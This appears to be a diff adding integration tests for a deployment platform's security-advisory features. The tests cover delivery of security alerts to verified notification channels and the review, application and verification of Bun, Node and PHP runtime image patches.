+    expect((await repos.securityAdvisory.project(f.project.id))?.autoRefresh).toBe(false);
+    expect(h.deploy.mock.calls.some(([, input]) => input.projectId === f.project.id)).toBe(false);
+  });
+  it("defaults security alerts to every verified channel while preserving per-channel opt-outs", async () => {
+    const f = await fixture();
+    const create = (kind: "in_app" | "webhook", verified = true) =>
+      repos.notificationChannel.create({
+        userId: f.owner.userId,
+        label: kind,
+        kind,
+        config: {},
+        enabled: true,
+        verified,
+      });
+    const first = await create("in_app"),
+      second = await create("webhook"),
+      unverified = await create("webhook", false);
+    const input = {
+      organizationId: f.owner.orgId,
+      eventType: "security.advisory",
+      resourceType: "project",
+      resourceId: f.project.id,
+      idempotencyKey: `security-test:${f.project.id}`,
+      payload: { message: "Patch this service." },
+    };
+    await db.transaction(await notification.prepare(input));
+    await db.transaction(await notification.prepare(input));
+    const rows = await db
+      .select()
+      .from(schema.notificationDelivery)
+      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
+    expect(rows.map((row) => row.channelId).sort()).toEqual([first.id, second.id].sort());
+    expect(rows.some((row) => row.channelId === unverified.id)).toBe(false);
+    await repos.notificationSubscription.upsert({
+      userId: f.owner.userId,
+      organizationId: f.owner.orgId,
+      category: "security.advisory",
+      channelId: first.id,
+      enabled: false,
+    });
+    expect(
+      await notificationPreferenceAllows(f.owner.userId, f.owner.orgId, "security.advisory", first),
+    ).toBe(false);
+    const third = await create("in_app");
+    await db.transaction(
+      await notification.prepare({ ...input, idempotencyKey: input.idempotencyKey + "-new" }),
+    );
+    const next = await db
+      .select()
+      .from(schema.notificationDelivery)
+      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
+    expect(next.filter((row) => row.channelId === first.id)).toHaveLength(1);
+    expect(next.filter((row) => row.channelId === second.id)).toHaveLength(2);
+    expect(next.filter((row) => row.channelId === third.id)).toHaveLength(1);
+    await repos.notificationDefault.upsert({
+      organizationId: f.owner.orgId,
+      category: "security.advisory",
+      defaultEnabled: true,
+      defaultChannelKinds: [],
+    });
+    expect(
+      await notificationPreferenceAllows(
+        f.owner.userId,
+        f.owner.orgId,
+        "security.advisory",
+        second,
+      ),
+    ).toBe(false);
+    await db.transaction(
+      await notification.prepare({ ...input, idempotencyKey: input.idempotencyKey + "-none" }),
+    );
+    const after = await db
+      .select()
+      .from(schema.notificationDelivery)
+      .where(eq(schema.notificationDelivery.organizationId, f.owner.orgId));
+    expect(after).toHaveLength(next.length);
+  });
+});
+
+describe("reviewed managed runtime patches", () => {
+  afterEach(() => vi.restoreAllMocks());
+
+  async function sourceFixture(runtime: "node" | "bun" = "bun") {
+    const f = await fixture();
+    await repos.service.remove(f.service.id);
+    const image = runtime === "bun" ? "oven/bun:1.3.1-alpine" : "node:22.22.0-bookworm";
+    await repos.project.update(f.project.id, {
+      framework: "nextjs",
+      packageManager: runtime === "bun" ? "bun" : "npm",
+      buildImage: image,
+      runtimeImage: null,
+      gitProvider: "github",
+      gitUrl: "https://github.com/example/source.git",
+      gitOwner: "example",
+      gitRepo: "source",
+      gitBranch: "main",
+      installCommand: `${runtime === "bun" ? "bun" : "npm"} install`,
+      buildCommand: "npm run build",
+      startCommand: "npm run start",
+    });
+    const source = (await repos.project.findById(f.project.id))!;
+    await db
+      .update(schema.deployment)
+      .set({
+        trigger: "manual",
+        commitSha: "1".repeat(40),
+        meta: { ...buildConfigSnapshot(source, "main"), ...(await resolveSnapshotTarget(source)) },
+      })
+      .where(eq(schema.deployment.id, f.deployment.id));
+    const feed = await h.feed();
+    feed.security.advisories = [
+      {
+        ...notice,
+        targets: [
+          {
+            kind: "runtime",
+            runtime,
+            affected: runtime === "bun" ? "<1.4.4" : "<22.23.4",
+            fixed: runtime === "bun" ? ">=1.4.4" : ">=22.23.4 <23 || >=24.22.1 <25",
+          },
+        ],
+      },
+    ];
+    h.feed.mockResolvedValue(feed);
+    const inventory: securityInventory.SecurityInventory = {
+      deploymentId: f.deployment.id,
+      checkedAt: new Date().toISOString(),
+      probeKey: securityProbeKey(feed.security.advisories),
+      images: [{ serviceId: null, serviceName: null, role: "base", ref: image, digest: OLD }],
+      runtimes: [{ serviceId: null, runtime, version: runtime === "bun" ? "1.3.1" : "22.22.0" }],
+      unknownServices: [],
+    };
+    await repos.securityAdvisory.saveInventory(
+      f.project.id,
+      f.owner.orgId,
+      f.deployment.id,
+      inventory,
+      new Date(),
+    );
+    const probe = vi
+      .spyOn(securityInventory, "projectSecurityInventory")
+      .mockResolvedValue(inventory);
+    return { ...f, inventory, probe, image, input: { ...f.input, serviceId: null } };
+  }
+
+  it.each(["bun", "node"] as const)(
+    "persists the reviewed %s version in both stages and rebuilds the deployed commit",
+    async (runtime) => {
+      const f = await sourceFixture(runtime);
+      const detail = await f.client.updates.security(f.project.id);
+      const patch = detail.findings[0].runtimePatch!;
+      const expected = runtime === "bun" ? "oven/bun:1.4.4-alpine" : "node:22.23.4-bookworm";
+      expect(detail.findings[0].canRefresh).toBe(true);
+      expect(patch).toMatchObject({ runtime, buildImage: expected, runtimeImage: expected });
+      const overview = await securityOverview(f.ctx, await h.feed());
+      expect(
+        overview.projects.find((p) => p.projectId === f.project.id)?.findings[0].runtimePatch,
+      ).toEqual(patch);
+      expect(h.deploy).not.toHaveBeenCalled();
+      await f.client.updates.applySecurity(f.project.id, {
+        ...f.input,
+        runtimePatchId: patch.reviewId,
+      });
+      const saved = (await repos.project.findById(f.project.id))!;
+      expect(saved).toMatchObject({ buildImage: expected, runtimeImage: expected });
+      // An ordinary later deploy snapshots the saved selection, not the old tag.
+      expect(buildConfigSnapshot(saved)).toMatchObject({
+        buildImage: expected,
+        runtimeImage: expected,
+        runtimeImageOverride: true,
+      });
+      expect(h.deploy).toHaveBeenCalledExactlyOnceWith(
+        expect.objectContaining({ organizationId: f.owner.orgId }),
+        expect.objectContaining({
+          projectId: f.project.id,
+          commitSha: "1".repeat(40),
+          trigger: "update",
+          forcePullImages: true,
+        }),
+      );
+      expect(h.deploy.mock.calls[0][1]).not.toHaveProperty("securityApproval");
+    },
+  );
+
+  it("requires review of the version change rather than accepting an old refresh button", async () => {
+    const f = await sourceFixture();
+    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow(
+      /review the patched version/,
+    );
+    expect((await repos.project.findById(f.project.id))?.buildImage).toBe(f.image);
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+
+  it.each(["configuration", "advisory"])(
+    "rejects a review after the %s changes",
+    async (change) => {
+      const f = await sourceFixture();
+      const patch = (await f.client.updates.security(f.project.id)).findings[0].runtimePatch!;
+      if (change === "configuration")
+        await repos.project.update(f.project.id, { buildCommand: "npm run other-build" });
+      else {
+        const feed = await h.feed();
+        feed.security.advisories[0].revision++;
+      }
+      await expect(
+        f.client.updates.applySecurity(f.project.id, {
+          ...f.input,
+          runtimePatchId: patch.reviewId,
+        }),
+      ).rejects.toThrow(/patch has changed/);
+      expect((await repos.project.findById(f.project.id))?.runtimeImage).toBeNull();
+      expect(h.deploy).not.toHaveBeenCalled();
+    },
+  );
+
+  it("does not save a patch if the registry cannot confirm the target image", async () => {
+    const f = await sourceFixture();
+    const patch = (await f.client.updates.security(f.project.id)).findings[0].runtimePatch!;
+    h.digest.mockResolvedValue(null);
+    await expect(
+      f.client.updates.applySecurity(f.project.id, { ...f.input, runtimePatchId: patch.reviewId }),
+    ).rejects.toThrow(/registry could not confirm/);
+    expect((await repos.project.findById(f.project.id))?.buildImage).toBe(f.image);
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+
+  it("can retry the reviewed patch after deployment admission fails", async () => {
+    const f = await sourceFixture();
+    const patch = (await f.client.updates.security(f.project.id)).findings[0].runtimePatch!;
+    h.deploy.mockRejectedValueOnce(new Error("Billing admission failed"));
+    const input = { ...f.input, runtimePatchId: patch.reviewId };
+    await expect(f.client.updates.applySecurity(f.project.id, input)).rejects.toThrow(
+      /Internal server error/,
+    );
+    expect((await repos.project.findById(f.project.id))?.runtimeImage).toBe(patch.runtimeImage);
+    await expect(f.client.updates.applySecurity(f.project.id, input)).resolves.toMatchObject({
+      deployment_id: "new-secure-deployment",
+    });
+    expect(h.deploy).toHaveBeenCalledTimes(2);
+  });
+
+  it.each(["dockerfile", "custom-image"])(
+    "does not offer an ineffective builder refresh for %s",
+    async (kind) => {
+      const f = await sourceFixture();
+      await repos.project.update(
+        f.project.id,
+        kind === "dockerfile"
+          ? { framework: "docker" }
+          : { runtimeImage: "ghcr.io/customer/runtime:1.3.1" },
+      );
+      const finding = (await f.client.updates.security(f.project.id)).findings[0];
+      expect(finding).toMatchObject({ canRefresh: false, imageChangeRequired: true });
+      expect(finding.runtimePatch).toBeUndefined();
+      await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow(
+        /configuration|Dockerfile/,
+      );
+      expect(h.deploy).not.toHaveBeenCalled();
+    },
+  );
+
+  it("does not extend automatic refresh consent to version-changing source patches", async () => {
+    const f = await sourceFixture();
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+    expect(await applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).toBeNull();
+    expect((await repos.project.findById(f.project.id))?.buildImage).toBe(f.image);
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+
+  it("refuses a proposed version that is still in the affected range", async () => {
+    const f = await sourceFixture();
+    const feed = await h.feed();
+    feed.security.advisories[0].targets[0].affected = "<1.4.5";
+    const finding = (await f.client.updates.security(f.project.id)).findings[0];
+    expect(finding).toMatchObject({ canRefresh: false, imageChangeRequired: true });
+    expect(finding.runtimePatch).toBeUndefined();
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+
+  it("preserves the existing refresh policy for other managed runtimes", async () => {
+    const f = await sourceFixture();
+    await repos.project.update(f.project.id, {
+      framework: "laravel",
+      packageManager: "composer",
+      runtimeVersion: "8.4",
+      buildImage: "php:8.4-cli",
+      runtimeImage: null,
+    });
+    const feed = await h.feed();
+    feed.security.advisories[0].targets = [
+      { kind: "runtime", runtime: "php", affected: "<8.4.27", fixed: ">=8.4.27" },
+    ];
+    f.probe.mockResolvedValue({
+      ...f.inventory,
+      runtimes: [{ serviceId: null, runtime: "php", version: "8.4.0" }],
+    });
+    const finding = (await f.client.updates.security(f.project.id)).findings[0];
+    expect(finding.canRefresh).toBe(true);
+    expect(finding.runtimePatch).toBeUndefined();
+    await f.client.updates.applySecurity(f.project.id, f.input);
+    expect((await repos.project.findById(f.project.id))?.buildImage).toBe("php:8.4-cli");
+    expect(h.deploy).toHaveBeenCalledOnce();
+  });
+
+  it("cannot use a reviewed patch from another organization", async () => {
+    const f = await sourceFixture();
+    const patch = (await f.client.updates.security(f.project.id)).findings[0].runtimePatch!;
+    const other = await seedOwner();
+    const ctx = buildBackgroundContext({ userId: other.userId, organizationId: other.orgId });
+    await expect(
+      applySecurityAdvisory(ctx, f.project.id, { ...f.input, runtimePatchId: patch.reviewId }),
+    ).rejects.toThrow();
+    expect((await repos.project.findById(f.project.id))?.runtimeImage).toBeNull();
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+
+  it.each(["1.3.1", "1.4.4"])(
+    "checks the running Bun version (%s) before resolving the finding",
+    async (version) => {
+      const f = await sourceFixture();
+      const patch = (await f.client.updates.security(f.project.id)).findings[0].runtimePatch!;
+      const next = await repos.deployment.create({
+        projectId: f.project.id,
+        organizationId: f.owner.orgId,
+        environment: "production",
+        branch: "main",
+        status: "ready",
+        commitSha: "1".repeat(40),
+      });
+      h.deploy.mockResolvedValue({ deployment: next });
+      await f.client.updates.applySecurity(f.project.id, {
+        ...f.input,
+        runtimePatchId: patch.reviewId,
+      });
+      await repos.project.update(f.project.id, { activeDeploymentId: next.id });
+      f.probe.mockResolvedValue({
+        ...f.inventory,
+        deploymentId: next.id,
+        runtimes: [{ serviceId: null, runtime: "bun", version }],
+      });
+      await reconcileSecurityRefreshes();
+      const [attempt] = await repos.securityAdvisory.attemptsForProject(f.project.id);
+      expect(attempt.status).toBe(version === "1.4.4" ? "verified" : "failed");
+      if (version === "1.3.1") expect(attempt.error).toContain("still affected");
+    },
+  );
+});
